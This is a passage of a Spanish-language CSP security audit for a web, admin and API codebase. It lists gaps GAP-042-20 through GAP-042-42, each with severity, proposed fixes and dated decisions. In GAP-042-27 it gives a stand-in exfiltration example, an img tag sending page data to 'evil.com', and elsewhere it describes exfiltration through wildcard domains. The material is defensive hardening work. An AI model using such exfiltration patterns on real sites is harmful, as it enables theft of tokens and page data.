**Detalle**:

- Version actual: `@tanstack/react-start: 1.131.26`
- Minimo spec: `>= 1.133.12` (nonce fix PR #5522)
- Recomendado spec: `>= 1.166.0` (setResponseHeaders workaround)
- La spec documenta que el upgrade debe ser un commit separado para rollback independiente

**Impacto**: Sin el upgrade, `ssr.nonce` no esta disponible como API. El nonce generado no puede inyectarse en script tags. Phase 2 imposible.

**Solucion propuesta**:

1. Este upgrade esta bloqueado por SPEC-045 (Vite 7) porque TanStack Start >= 1.132.0 puede requerir Vite 7
2. Considerar upgrade incremental a 1.133.12 sin Vite 7 si es compatible
3. **Recomendacion**: Incluir como tarea explicita en SPEC-045

**Decision (2026-03-17)**: ⏸️ POSTERGAR. Bloqueado por SPEC-045 (Vite 7 + TanStack upgrade).

---

### GAP-042-20: Admin usa `setResponseHeader()` en vez de `getResponseHeaders().set()` pattern

| Campo | Valor |
|-------|-------|
| **Severidad** | LOW |
| **Prioridad** | LOW |
| **Complejidad** | LOW |
| **Auditoria** | #2 (2026-03-16) |
| **Archivos** | `apps/admin/src/middleware.ts:47` |

**Descripcion**: La spec documenta explicitamente que se debe usar el patron `getResponseHeaders().set(key, value)` seguido de `setResponseHeaders(headers)` para evitar el bug de Issue #5407 (spread operator en Headers produce objeto vacio). Sin embargo, el codigo usa `setResponseHeader(CSP_HEADER_NAME, cspValue)` (importado de `@tanstack/react-start/server`), que es una API diferente (`setResponseHeader` singular vs `setResponseHeaders` plural).

**Estado real**: El codigo actual FUNCIONA correctamente con `setResponseHeader()` porque es una API de H3 que accede al event desde async local storage. No tiene el bug del spread operator. La spec puede estar desactualizada o referirse a una API diferente.

**Impacto**: Bajo. Funciona, pero difiere de lo que la spec documenta. Al upgradear TanStack, habria que verificar que `setResponseHeader()` sigue disponible.

**Solucion propuesta**:

1. Documentar que se uso `setResponseHeader` en vez del patron documentado, y por que funciona
2. Al hacer SPEC-045, verificar cual patron es correcto para la nueva version
3. **Recomendacion**: No requiere accion inmediata, documentar diferencia

**Decision (2026-03-17)**: ✅ HACER. Documentar en el código la diferencia de patrón con la spec y por qué funciona.

---

### GAP-042-21: start.ts usa `registerGlobalMiddleware()` en vez de `createStart()`

| Campo | Valor |
|-------|-------|
| **Severidad** | MEDIUM |
| **Prioridad** | MEDIUM |
| **Complejidad** | MEDIUM |
| **Auditoria** | #2 (2026-03-16) |
| **Archivos** | `apps/admin/src/start.ts:19-24` |

**Descripcion**: La spec requiere que `start.ts` use `createStart()` con `requestMiddleware` para registrar el CSP middleware a nivel HTTP (cubriendo SSR). El codigo real usa `registerGlobalMiddleware({ middleware: [cspMiddleware] })`, que es la API de TanStack Start 1.131.26 para server function middleware.

**Relacion con otros gaps**: Este gap es consecuencia directa de GAP-042-19 (version TanStack < minimo). `createStart({ requestMiddleware })` no esta disponible en 1.131.26. Pero el archivo existe como preparacion, y los comentarios documentan la migracion pendiente (lineas 12-14).

**Impacto**: El middleware CSP solo cubre server functions, no SSR initial. Es la causa raiz de GAP-042-13.

**Solucion propuesta**:

1. Migrar a `createStart({ requestMiddleware })` cuando TanStack >= 1.132.0 este disponible
2. **Recomendacion**: Se resuelve con SPEC-045

**Decision (2026-03-17)**: ⏸️ POSTERGAR. Bloqueado por SPEC-045. Se resuelve con migración a createStart({ requestMiddleware }).

---

### GAP-042-22: 10+ componentes web con inline scripts no documentados en spec

| Campo | Valor |
|-------|-------|
| **Severidad** | MEDIUM |
| **Prioridad** | MEDIUM |
| **Complejidad** | LOW |
| **Auditoria** | #2 (2026-03-16) |
| **Archivos** | Ver lista completa abajo |

**Descripcion**: La spec solo menciona los 2 scripts `is:inline` de `BaseLayout.astro` (FOUC prevention y scroll-reveal). Sin embargo, la auditoria exhaustiva encontro **10+ componentes** con bloques `<script>` sin `is:inline` que Astro hashea automaticamente:

1. `apps/web/src/components/Header.astro` (~100 lineas de JS para mobile menu, scroll, theme toggle)
2. `apps/web/src/components/Footer.astro` (newsletter form handler)
3. `apps/web/src/components/NavigationProgress.astro` (View Transitions lifecycle)
4. `apps/web/src/components/ThemeToggle.astro` (theme click handler, localStorage)
5. `apps/web/src/components/AccordionFAQ.astro` (single-open accordion)
6. `apps/web/src/components/SortDropdown.astro` (sort select handler)
7. `apps/web/src/components/HeroSection.astro` (hero scroll effects)
8. `apps/web/src/components/DestinationCarousel.astro` (carousel scroll snap, keyboard nav)
9. `apps/web/src/components/DestinationPreview.astro` (hover preview positioning)
10. `apps/web/src/components/LitoralMap.astro` (SVG map interactions)

**Impacto**:

- Estos scripts SIN `is:inline` son procesados por Astro y reciben hashes automaticamente.. esto es CORRECTO y seguro
- PERO: si alguno de estos scripts cambia, el hash cambia, y el CSP del meta tag se actualiza automaticamente
- El riesgo es que la spec no los documenta, asi que cualquier cambio en estos componentes podria generar violations inesperadas sin que el equipo entienda por que
- Ademas, algunos de estos scripts son bastante largos (Header.astro ~100 lineas), lo cual aumenta el riesgo de cambios frecuentes

**Solucion propuesta**:

1. Documentar la lista completa de scripts inline en la spec o en un archivo dedicado
2. Considerar migrar los scripts mas largos (Header, DestinationCarousel, DestinationPreview, LitoralMap) a modulos ES separados para facilitar mantenimiento
3. **Recomendacion**: Documentar directo (no requiere spec), considerar migracion de los mas largos en SPEC-029 (Web Homepage Redesign)

**Decision (2026-03-17)**: ✅ HACER. Documentar la lista completa de scripts inline en la spec/código.

---

### GAP-042-23: Tests de CSP helpers incompletos vs spec requirements

| Campo | Valor |
|-------|-------|
| **Severidad** | MEDIUM |
| **Prioridad** | MEDIUM |
| **Complejidad** | LOW |
| **Auditoria** | #2 (2026-03-16) |
| **Archivos** | `apps/admin/test/lib/csp-helpers.test.ts`, `apps/web/test/lib/middleware-helpers.test.ts` |

**Descripcion**: La spec establece requisitos minimos de tests:

- `buildSentryReportUri`: 4 test cases (valid DSN, invalid DSN, missing projectId, missing key)
- `buildCspDirectives`: 12+ test cases

**Estado real**:

- **Admin `buildSentryReportUri`**: 3 tests (falta test de "missing key" explicitamente)
- **Admin `buildCspDirectives`**: 9-10 tests (spec dice 12+, faltan ~2-3 escenarios)
- **Web `buildSentryReportUri`**: 4 tests (cumple)

**Tests faltantes segun la spec** (admin):

- `buildSentryReportUri` con DSN sin key (ej: `https://@o456.ingest.sentry.io/789`)
- `buildCspDirectives` verificando que NO incluye `'unsafe-inline'` en directiva que no corresponde
- `buildCspDirectives` verificando el orden de directivas
- `buildCspDirectives` con nonce vacio o malformado (edge case)

**Impacto**: Coverage menor al especificado. Edge cases no cubiertos podrian causar CSP headers malformados sin deteccion.

**Solucion propuesta**:

1. Agregar los tests faltantes para alcanzar el minimo de la spec
2. **Recomendacion**: Resolver directo (fix trivial, agregar 3-4 tests)

**Decision (2026-03-17)**: ✅ HACER. Agregar 3-4 tests faltantes para cumplir mínimo de spec. ~50 líneas.

---

### GAP-042-24: Sin validacion de CSP en CI/CD pipeline

| Campo | Valor |
|-------|-------|
| **Severidad** | MEDIUM |
| **Prioridad** | LOW |
| **Complejidad** | MEDIUM |
| **Auditoria** | #2 (2026-03-16) |
| **Archivos** | `.github/workflows/ci.yml`, `.github/workflows/cd-production.yml` |

**Descripcion**: No hay ningun paso en CI/CD que verifique:

- Que los CSP headers estan presentes en las respuestas
- Que las directivas CSP son correctas
- Que no hay regresiones de CSP (ej: alguien agrega `'unsafe-eval'` al web app por accidente)
- Lighthouse security audit score
- Build verification con CSP (spec requiere `pnpm build && pnpm preview` verification)

**Impacto**: Una PR puede romper CSP o eliminar headers de seguridad sin que CI/CD lo detecte. Solo se descubriria en produccion o durante revision manual.

**Solucion propuesta**:

1. Agregar un paso de `pnpm build` en CI que verifique que el build produce CSP valido
2. Agregar un test de integracion que haga una request al preview server y verifique headers
3. Considerar Lighthouse CI para security audit automatizado
4. **Recomendacion**: Incluir en SPEC-046 o resolver directo si es simple

**Decision (2026-03-17)**: ✅ HACER. Agregar validación de CSP en CI/CD pipeline.

---

### GAP-042-25: Inline styles dinamicos no cubiertos por CSP hashes

| Campo | Valor |
|-------|-------|
| **Severidad** | LOW |
| **Prioridad** | LOW |
| **Complejidad** | LOW |
| **Auditoria** | #2 (2026-03-16) |
| **Archivos** | Multiples componentes en `apps/web/src/components/` |

**Descripcion**: Multiples componentes usan inline `style` attributes con valores dinamicos:

- `Header.astro`: `style={`transition-delay: ${index * NAV_STAGGER_MS}ms`}`
- `HeroSection.astro`: `style="font-size: clamp(...)"`
- `NavigationProgress.astro`: `style="width: 0%; opacity: 0;"`
- `DestinationCarousel.astro`: `style={`width: ${initialWidth}%`}`
- `ParallaxDivider.astro`: `style={`background-image: url('${image}');`}`
- `BackgroundPattern.astro`: `style={`background-image: url(...); background-size: ...`}`
- Router pending bar (admin): `style={{ animation: 'router-pending-bar 1.5s...' }}`

**Nota**: Los inline `style` attributes (propiedad `style` de HTMLElement) NO son bloqueados por CSP `style-src` por default. Solo `<style>` tags y `@import` son controlados por `style-src`. Los inline style attributes solo se bloquean si se configura `style-src` SIN `'unsafe-inline'`, lo cual requeriria `'unsafe-hashes'` (CSP Level 3, soporte limitado).

**Impacto**: Bajo. El `'unsafe-inline'` en `style-src` que ya se incluye cubre estos casos. Pero es buena practica preferir clases CSS sobre inline styles para mejor mantenibilidad y performance.

**Solucion propuesta**:

1. Migrar inline styles dinamicos a clases CSS con CSS custom properties (variables)
2. Ej: `style={`transition-delay: ${ms}ms`}` → `style="--delay: ${ms}ms"` + CSS `.nav-link { transition-delay: var(--delay) }`
3. **Recomendacion**: No requiere spec, mejora de calidad para considerar en refactoring futuro

**Decision (2026-03-17)**: ⏸️ POSTERGAR. Refactoring de calidad CSS, no un gap real de seguridad CSP. Resolver en refactoring futuro.

---

### GAP-042-26: Falta directiva `upgrade-insecure-requests` (Todas las apps)

| Campo | Valor |
|-------|-------|
| **Severidad** | HIGH |
| **Prioridad** | HIGH |
| **Complejidad** | LOW (1 linea por app) |
| **Auditoria** | #3 (2026-03-16) |
| **Archivos** | `apps/web/src/middleware.ts`, `apps/admin/src/lib/csp-helpers.ts`, `apps/api/src/middlewares/security.ts` |

**Descripcion**: Ninguna de las tres apps incluye `upgrade-insecure-requests` en su CSP. Esta directiva instruye al browser a upgradear automaticamente requests HTTP a HTTPS antes de hacerlas.

**Impacto**: Sin esta directiva, mixed content (recursos HTTP en pagina HTTPS) puede cargarse sin upgrade, habilitando ataques man-in-the-middle. HSTS mitiga parcialmente pero `upgrade-insecure-requests` es defense-in-depth especificamente para resource loading.

**Mitigacion actual**: HSTS header configurado via `vercel.json` con `includeSubDomains; preload`.

**Solucion propuesta**:

1. Agregar `upgrade-insecure-requests` a las directivas CSP de las 3 apps
2. **Recomendacion**: Resolver directo (fix trivial, 1 linea por app)

**Decision (2026-03-17)**: ✅ HACER. Agregar `upgrade-insecure-requests` a las 3 apps. 1 línea por app.

---

### GAP-042-27: `img-src` excesivamente permisivo (`https:` wildcard) (Web + Admin)

| Campo | Valor |
|-------|-------|
| **Severidad** | **HIGH** (elevado de MEDIUM en auditoria #4.. permite exfiltracion sin script injection, solo HTML injection) |
| **Prioridad** | HIGH (elevado de MEDIUM en auditoria #4) |
| **Complejidad** | MEDIUM |
| **Auditoria** | #3 (2026-03-16) |
| **Archivos** | `apps/web/src/middleware.ts:114`, `apps/admin/src/lib/csp-helpers.ts:65`, `apps/web/astro.config.mjs:152` |

**Descripcion**: Web y admin permiten imagenes desde CUALQUIER origen HTTPS (`img-src 'self' data: https:`). Esto es extremadamente amplio.

**Impacto**: Permite exfiltracion de datos via image URLs (ej: `<img src="https://evil.com/steal?data=...">`). Un atacante con HTML injection (no necesariamente script injection) puede exfiltrar contenido de la pagina, CSRF tokens, u otra data visible en el DOM construyendo URLs de imagen con la data como query parameters.

**Solucion propuesta**:

1. Restringir a dominios conocidos: `'self' data: https://*.vercel.app https://res.cloudinary.com` (o CDN real usado)
2. Enumerar dominios especificos en vez de permitir todo HTTPS
3. **Recomendacion**: Resolver directo cuando se definan los CDNs de produccion

**Decision (2026-03-17)**: ⏸️ POSTERGAR. Resolver cuando se definan dominios/CDNs de producción. Sin dominios definidos, restringir ahora puede romper imágenes.

---

### GAP-042-28: Falta directiva `Trusted-Types` (Todas las apps)

| Campo | Valor |
|-------|-------|
| **Severidad** | MEDIUM |
| **Prioridad** | LOW |
| **Complejidad** | HIGH (4/5) |
| **Auditoria** | #3 (2026-03-16) |
| **Archivos** | Todas las configuraciones CSP |

**Descripcion**: Ninguna app configura `require-trusted-types-for 'script'` o `trusted-types`. Trusted Types previene DOM-based XSS restringiendo dangerous sink APIs (`innerHTML`, `document.write`, etc.) a solo aceptar objetos tipados.

**Impacto**: Sin Trusted Types, DOM-based XSS via `innerHTML`, `document.write`, `eval`, y otros sinks sigue siendo completamente posible incluso con CSP estricto. Es la defensa primaria contra DOM XSS.

**Solucion propuesta**:

1. Agregar `require-trusted-types-for 'script'` en Report-Only primero para medir violations
2. Crear trusted type policies para operaciones DOM de React y librerias
3. **Recomendacion**: Phase 3 enhancement, planificar en spec futura

**Decision (2026-03-17)**: ⏸️ POSTERGAR. Phase 3 enhancement. Complejidad alta, requiere policies para React y terceros.

---

### GAP-042-29: `*.ingest.sentry.io` podria ser insuficiente vs `*.sentry.io`

| Campo | Valor |
|-------|-------|
| **Severidad** | LOW |
| **Prioridad** | LOW |
| **Complejidad** | LOW |
| **Auditoria** | #3 (2026-03-16) |
| **Archivos** | `apps/web/src/middleware.ts:115`, `apps/admin/src/lib/csp-helpers.ts:67` |

**Descripcion**: Web y admin usan `*.ingest.sentry.io` en `connect-src`. La documentacion oficial de Sentry recomienda `*.sentry.io`. Aunque `*.ingest.sentry.io` es mas restrictivo (least privilege), puede romperse si Sentry cambia su infraestructura.

**Impacto**: Bajo riesgo directo. Si Sentry agrega endpoints fuera de `ingest`, violations no se reportarian silenciosamente.

**Solucion propuesta**:

1. Mantener `*.ingest.sentry.io` (least privilege es bueno)
2. Monitorear violations en URLs de Sentry reporting
3. **Recomendacion**: No requiere accion inmediata, monitorear

**Decision (2026-03-17)**: ✅ HACER. Cambiar a `*.sentry.io` como recomienda la doc oficial de Sentry.

---

### GAP-042-30: Rutas de docs del API bypass TODOS los security headers

| Campo | Valor |
|-------|-------|
| **Severidad** | **HIGH** (elevado de MEDIUM en auditoria #4.. bypass de HSTS, X-Frame-Options, etc. habilita clickjacking y MIME sniffing en docs publicos) |
| **Prioridad** | HIGH (elevado de MEDIUM en auditoria #4) |
| **Complejidad** | LOW |
| **Auditoria** | #3 (2026-03-16) |
| **Archivos** | `apps/api/src/middlewares/security.ts:40` |

**Descripcion**: El middleware de seguridad del API hace bypass de TODOS los security headers para paths que empiezan con `/docs`. Esto significa que HSTS, X-Frame-Options, X-Content-Type-Options, Referrer-Policy, y Permissions-Policy se eliminan TODOS, no solo CSP.

**Impacto**: Las paginas de documentacion (Swagger UI, Scalar) se sirven sin proteccion contra clickjacking (no X-Frame-Options), sin proteccion contra MIME sniffing, y sin HSTS. Si el endpoint es publicamente accesible, podria ser framed por un atacante o usado para phishing.

**Solucion propuesta**:

1. Solo bypass CSP para docs routes, NO todos los security headers
2. Aplicar HSTS, X-Frame-Options, X-Content-Type-Options, y Referrer-Policy a TODAS las rutas incluyendo docs
3. **Recomendacion**: Resolver directo (fix simple en security middleware)

**Decision (2026-03-17)**: ✅ HACER. Cambiar bypass para que solo excluya CSP en docs routes, manteniendo HSTS, X-Frame-Options y demás headers de seguridad. ~5 líneas.

---

### GAP-042-31: Web `connect-src` no incluye dominio explicito del API

| Campo | Valor |
|-------|-------|
| **Severidad** | MEDIUM |
| **Prioridad** | MEDIUM |
| **Complejidad** | LOW |
| **Auditoria** | #3 (2026-03-16) |
| **Archivos** | `apps/web/src/middleware.ts:115` |

**Descripcion**: El CSP del web tiene `connect-src 'self' https://*.ingest.sentry.io https://*.vercel.app`. Si el API esta en un dominio diferente a `'self'` y no matchea `*.vercel.app` (ej: dominio custom), las llamadas API desde el browser seran bloqueadas.

**Impacto**: Misconfigured `connect-src` puede causar que la app falle silenciosamente o presione a devs a debilitar la politica. Ademas, `*.vercel.app` permite conexiones a CUALQUIER app hosteada en Vercel.

**Solucion propuesta**:

1. Agregar el dominio explicito del API (ej: `https://api.hospeda.com.ar`)
2. Restringir `*.vercel.app` al patron de deployment especifico si es posible
3. **Recomendacion**: Resolver directo cuando se definan dominios de produccion

**Decision (2026-03-17)**: ⏸️ POSTERGAR. Resolver cuando se definan dominios de producción. Relacionado con GAP-042-38.

---

### GAP-042-32: `Permissions-Policy` incompleto en Web y Admin

| Campo | Valor |
|-------|-------|
| **Severidad** | MEDIUM |
| **Prioridad** | LOW |
| **Complejidad** | LOW |
| **Auditoria** | #3 (2026-03-16) |
| **Archivos** | `apps/web/vercel.json`, `apps/admin/vercel.json` |

**Descripcion**: Web y admin solo bloquean `camera=(), microphone=(), geolocation=()` en vercel.json. El API configura una lista mucho mas completa: `payment=(), usb=(), magnetometer=(), gyroscope=(), accelerometer=()` adicionales. Web y admin permiten Payment Request API, USB, y sensor APIs por default.

**Impacto**: Scripts inyectados podrian usar Payment Request API, acceder a sensores, o fingerprint users via APIs de hardware.

**Solucion propuesta**:

1. Unificar `Permissions-Policy` en vercel.json de web y admin para incluir la lista completa del API
2. **Recomendacion**: Resolver directo (fix trivial en vercel.json)

**Decision (2026-03-17)**: ✅ HACER. Unificar Permissions-Policy en web y admin vercel.json para incluir la lista completa del API.

---

### GAP-042-33: Web app falta `frame-src 'none'` explicito

| Campo | Valor |
|-------|-------|
| **Severidad** | LOW |
| **Prioridad** | LOW |
| **Complejidad** | LOW |
| **Auditoria** | #3 (2026-03-16) |
| **Archivos** | `apps/web/src/middleware.ts:109-122`, `apps/web/astro.config.mjs:137-160` |

**Descripcion**: El CSP del web no incluye directiva `frame-src`. Cae al fallback `default-src 'self'`, que permite iframes same-origin. El admin correctamente tiene `frame-src https://*.mercadopago.com`.

**Impacto**: Un atacante con HTML injection podria embedear iframes same-origin para UI redressing o explotar comportamiento de paginas same-origin.

**Solucion propuesta**:

1. Agregar `frame-src 'none'` al CSP del web (no hay necesidad legitima de iframes)
2. **Recomendacion**: Resolver directo (1 linea)

**Decision (2026-03-17)**: ⏸️ POSTERGAR. default-src 'self' ya cubre implícitamente. Bajo impacto.

---

### GAP-042-34: Sentry DSN expuesto en `report-uri` del header CSP

| Campo | Valor |
|-------|-------|
| **Severidad** | LOW |
| **Prioridad** | LOW |
| **Complejidad** | HIGH (requiere proxy) |
| **Auditoria** | #3 (2026-03-16) |
| **Archivos** | `apps/web/src/middleware.ts:124-125`, `apps/admin/src/lib/csp-helpers.ts:72-75` |

**Descripcion**: El `report-uri` expone Sentry project ID y key en la URL: `https://{host}/api/{project_id}/security/?sentry_key={key}`. Visible para cualquier usuario inspeccionando response headers.

**Impacto**: Un atacante puede usar el DSN expuesto para floodear el proyecto con CSP violation reports falsos, consumiendo quota de Sentry o enmascarando violations reales en ruido. El DSN solo permite write (no read).

**Solucion propuesta**:

1. Aceptar el riesgo (DSNs de Sentry son semi-publicos por diseno)
2. O usar un proxy de CSP reporting que reciba reports y forwardee a Sentry, ocultando el DSN
3. **Recomendacion**: Aceptar riesgo, no requiere accion (Sentry tiene rate limiting)

**Decision (2026-03-17)**: ⏸️ POSTERGAR. Riesgo aceptado, DSN público por diseño de Sentry. Rate limiting built-in.

---

### GAP-042-35: Sin directiva `media-src` explicita (Web + Admin)

| Campo | Valor |
|-------|-------|
| **Severidad** | LOW |
| **Prioridad** | LOW |
| **Complejidad** | LOW |
| **Auditoria** | #3 (2026-03-16) |
| **Archivos** | `apps/web/src/middleware.ts`, `apps/admin/src/lib/csp-helpers.ts` |

**Descripcion**: Ni web ni admin incluyen `media-src`. Cae al fallback `default-src 'self'`, que permite media same-origin. Si la app nunca sirve audio/video, bloquear explicitamente reduce superficie de ataque.

**Solucion propuesta**:

1. Agregar `media-src 'self'` o `'none'` segun necesidad
2. **Recomendacion**: Resolver directo (1 linea)

**Decision (2026-03-17)**: ✅ HACER. Agregar `media-src 'self'` explícito en web y admin. 1 línea x 2.

---

### GAP-042-36: API `font-src` permite URIs `data:`

| Campo | Valor |
|-------|-------|
| **Severidad** | LOW |
| **Prioridad** | LOW |
| **Complejidad** | LOW |
| **Auditoria** | #3 (2026-03-16) |
| **Archivos** | `apps/api/src/middlewares/security.ts:58` |

**Descripcion**: El CSP del API tiene `fontSrc: ["'self'", 'https:', 'data:']`. Un API que sirve JSON no necesita fonts, y `data:` fonts son un vector conocido para exploits basados en fuentes.

**Solucion propuesta**:

1. Cambiar a `fontSrc: ["'none'"]` ya que el API sirve JSON
2. O `fontSrc: ["'self'"]` si docs routes necesitan fonts
3. **Recomendacion**: Resolver directo (fix trivial)

**Decision (2026-03-17)**: ✅ HACER. Cambiar API font-src a `'self'` (docs routes pueden necesitar fonts). 1 línea.

---

### GAP-042-37: `X-XSS-Protection` inconsistente entre vercel.json y API middleware

| Campo | Valor |
|-------|-------|
| **Severidad** | **MEDIUM** (elevado de INFO en auditoria #4.. `1; mode=block` puede INTRODUCIR vulnerabilidades XSS en IE/old Edge via selective script blocking) |
| **Prioridad** | MEDIUM (elevado de LOW en auditoria #4) |
| **Complejidad** | LOW |
| **Auditoria** | #3 (2026-03-16) |
| **Archivos** | `apps/api/vercel.json`, `apps/api/src/middlewares/security.ts` |

**Descripcion**: `vercel.json` setea `X-XSS-Protection: 0` (correcto.. deshabilita XSS auditor buggy). El middleware `secureHeaders()` setea `xXssProtection: '1; mode=block'` (habilita el XSS auditor). Son contradictorios. La recomendacion moderna es `0`.

**Impacto**: El XSS auditor de IE/old Edge tiene vulnerabilidades de bypass conocidas. Setearlo a `1; mode=block` puede introducir vulnerabilidades en edge cases. Browsers modernos eliminaron el XSS auditor.

**Solucion propuesta**:

1. Cambiar `xXssProtection: '0'` en `secureHeaders()` para alinear con vercel.json y best practices
2. **Recomendacion**: Resolver directo (1 linea)

**Decision (2026-03-17)**: ✅ HACER. Cambiar middleware a `xXssProtection: '0'` para alinear con vercel.json y best practices modernas. 1 línea.

---

### GAP-042-38: Wildcard `*.vercel.app` en `connect-src` permite exfiltracion

| Campo | Valor |
|-------|-------|
| **Severidad** | MEDIUM |
| **Prioridad** | MEDIUM |
| **Complejidad** | LOW |
| **Auditoria** | #3 (2026-03-16) |
| **Archivos** | `apps/web/src/middleware.ts:115`, `apps/admin/src/lib/csp-helpers.ts:67` |

**Descripcion**: Web y admin permiten `connect-src https://*.vercel.app`. Esto permite `fetch()`/`XMLHttpRequest` a CUALQUIER aplicacion hosteada en Vercel, no solo los deployments de Hospeda. Efectivamente, anula restricciones de `connect-src` para endpoints de exfiltracion hosteados en Vercel.

**Impacto**: Un atacante con script injection puede exfiltrar datos a cualquier dominio `.vercel.app` que controle. Bypass trivial de `connect-src`.

**Solucion propuesta**:

1. Reemplazar con URLs de deployment especificas: `https://hospeda-*.vercel.app` o dominios de produccion exactos
2. **Recomendacion**: Resolver directo cuando se definan dominios de produccion

**Decision (2026-03-17)**: ⏸️ POSTERGAR. Resolver cuando se definan dominios de producción. Mismo bloqueo que GAP-042-27 y 31.

---

### GAP-042-39: API route factory aplica CSP permisivo (`'unsafe-inline'` + CDNs) a TODAS las rutas

| Campo | Valor |
|-------|-------|
| **Severidad** | **CRITICAL** |
| **Prioridad** | HIGH |
| **Complejidad** | MEDIUM |
| **Auditoria** | #4 (2026-03-17) |
| **Archivos** | `apps/api/src/utils/route-factory.ts:236-272`, `apps/api/src/utils/env-config-helpers.ts:180-183` |

**Descripcion**: La funcion `applyRouteMiddlewares` en el route factory HARDCODEA una politica CSP permisiva que se aplica a TODAS las rutas creadas via factories (public, protected, admin). Esta politica incluye:

```typescript
scriptSrc: ["'self'", "'unsafe-inline'", 'https://cdn.jsdelivr.net', 'https://unpkg.com'],
styleSrc: ["'self'", "'unsafe-inline'", 'https://cdn.jsdelivr.net', 'https://unpkg.com'],
```

**Problema critico**: Esta politica CSP del route factory SOBREESCRIBE la politica estricta del `security.ts` middleware (`scriptSrc: ["'self'"]`). El resultado es que TODAS las rutas API terminan con `'unsafe-inline'` en script-src y style-src, ademas de permitir scripts desde `cdn.jsdelivr.net` y `unpkg.com` (CDNs publicos que sirven contenido subido por usuarios).

**Por que es CRITICO**:

1. `'unsafe-inline'` anula TODA proteccion CSP contra XSS inline
2. `cdn.jsdelivr.net` y `unpkg.com` son CDNs donde CUALQUIER persona puede subir paquetes npm.. un atacante puede hostear payloads maliciosos ahi y cargarlos via script-src
3. Los comentarios dicen "para documentation UI" pero la politica se aplica a TODAS las rutas, no solo a `/docs`
4. El `env-config-helpers.ts` tiene una funcion `getSecurityConfig()` que lee CSP de env vars.. pero el route factory la IGNORA completamente
5. El middleware de `security.ts` con su politica estricta se aplica ANTES, pero el route factory lo sobreescribe DESPUES

**Diferencia con GAP-042-30**: GAP-042-30 reporta que `/docs` bypasea TODOS los security headers. Este gap es DIFERENTE: el route factory aplica un CSP PERMISIVO a TODAS las rutas (no solo docs), y el CSP de `security.ts` queda anulado.

**Impacto**: La proteccion CSP del API es FALSA. El middleware `security.ts` genera CSP estricto, pero el route factory lo sobreescribe con una politica que permite scripts inline y desde CDNs publicos. Si alguna ruta API retorna HTML (errores, redirects), XSS es posible.

**Solucion propuesta**:

1. **Inmediata**: Mover la configuracion CSP permisiva del route factory SOLO a las rutas de docs
2. **Eliminar** `'unsafe-inline'` y CDN domains del CSP de rutas non-docs
3. **Usar** `getSecurityConfig()` de `env-config-helpers.ts` para que la politica sea configurable
4. **Alternativa**: Si docs routes necesitan CDNs, crear un middleware CSP separado solo para `/docs/*`
5. **Recomendacion**: Resolver directo (fix de seguridad critico, no requiere spec formal)

**Decision (2026-03-17)**: ✅ HACER. Mover CSP permisivo solo a docs routes. Fix directo sin spec.

---

### GAP-042-40: Wildcard `*.mercadopago.com` demasiado amplio en admin `connect-src`

| Campo | Valor |
|-------|-------|
| **Severidad** | MEDIUM |
| **Prioridad** | MEDIUM |
| **Complejidad** | LOW |
| **Auditoria** | #4 (2026-03-17) |
| **Archivos** | `apps/admin/src/lib/csp-helpers.ts:67` |

**Descripcion**: El admin CSP permite `connect-src https://*.mercadopago.com`, que es un wildcard que cubre TODOS los subdominios de MercadoPago. Algunos subdominios pueden servir contenido generado por usuarios o tener politicas de seguridad mas laxas.

**Subdominios reales usados por el SDK** (segun analisis de source code de la spec):

- `api.mercadopago.com` (API principal)
- `sdk.mercadopago.com` (SDK JS)
- `www.mercadopago.com` (checkout redirect)

**Impacto**: Un atacante podria explotar subdominios menos seguros de MercadoPago para exfiltrar datos o inyectar contenido. Aunque menor que `*.vercel.app` (GAP-042-38) porque MercadoPago controla todos sus subdominios, sigue siendo una superficie innecesariamente amplia.

**Solucion propuesta**:

1. Reemplazar `https://*.mercadopago.com` con los subdominios especificos: `https://api.mercadopago.com https://sdk.mercadopago.com https://www.mercadopago.com`
2. Verificar con network devtools durante checkout flow real cuales subdominios se usan
3. **Recomendacion**: Resolver directo cuando se verifique el checkout flow completo

**Decision (2026-03-17)**: ✅ HACER. Restringir `*.mercadopago.com` a subdominios específicos (`api.`, `sdk.`, `www.`). Verificar con network devtools si hay otros.

---

### GAP-042-41: Sin tests de propiedades de seguridad del nonce (Admin)

| Campo | Valor |
|-------|-------|
| **Severidad** | MEDIUM |
| **Prioridad** | MEDIUM |
| **Complejidad** | LOW |
| **Auditoria** | #4 (2026-03-17) |
| **Archivos** | `apps/admin/src/middleware.ts:40-49`, `apps/admin/test/lib/csp-helpers.test.ts` |

**Descripcion**: Los tests existentes verifican que `buildCspDirectives` genera strings correctos con un nonce dado, pero NO hay tests que verifiquen las propiedades de seguridad del nonce en si:

**Tests faltantes criticos**:

1. **Uniqueness**: Cada request debe generar un nonce diferente (dos llamadas al middleware no deben producir el mismo nonce)
2. **Entropy**: El nonce debe tener al menos 128 bits de entropia (16 bytes via `randomBytes(16)`)
3. **Format**: El nonce debe ser base64url valido (no contener caracteres que rompan el CSP header)
4. **Cryptographic source**: Verificar que se usa `randomBytes` (CSPRNG) y no `Math.random()`
5. **No leaks**: El nonce no debe aparecer en response body, error messages, o logs

**Diferencia con GAP-042-06**: GAP-042-06 cubre la falta de tests de integracion para headers CSP en responses reales. Este gap es sobre tests UNITARIOS de las propiedades de seguridad del nonce generator en si mismo.

**Diferencia con GAP-042-23**: GAP-042-23 cubre tests faltantes segun la spec (edge cases de funciones helper). Este gap es sobre tests de SEGURIDAD del mecanismo de nonce que no estan en la spec.

**Impacto**: Sin tests de unicidad y entropia, una regresion (ej: alguien reemplaza `randomBytes` con un cache o un valor fijo para debugging) pasaria desapercibida.

**Solucion propuesta**:

1. Agregar test de unicidad: generar N nonces y verificar que todos son diferentes
2. Agregar test de longitud minima: nonce debe tener >= 22 caracteres (128 bits en base64url)
3. Agregar test de formato: nonce debe matchear `/^[A-Za-z0-9_-]+$/` (base64url charset)
4. **Recomendacion**: Resolver directo (agregar ~5 tests, ~30 lineas)

**Decision (2026-03-17)**: ✅ HACER. Agregar tests de seguridad del nonce (unicidad, entropía, formato, fuente criptográfica). ~5 tests, ~30 líneas.

---

### GAP-042-42: Inline `onclick` handler en 500.astro viola CSP

| Campo | Valor |
|-------|-------|
| **Severidad** | HIGH |
| **Prioridad** | HIGH |
| **Complejidad** | LOW |
| **Auditoria** | #5 (2026-03-17) |
| **Archivos** | `apps/web/src/pages/500.astro:141` |

**Descripcion**: La pagina 500.astro tiene un boton "Retry" con un inline event handler:

```html
<button type="button" onclick="window.location.reload()" class="...">
```

Los inline event handlers (`onclick`, `onload`, `onerror`, etc.) son tratados como inline scripts por CSP. Son bloqueados por CUALQUIER CSP que no incluya `'unsafe-inline'` en `script-src`. Dado que:

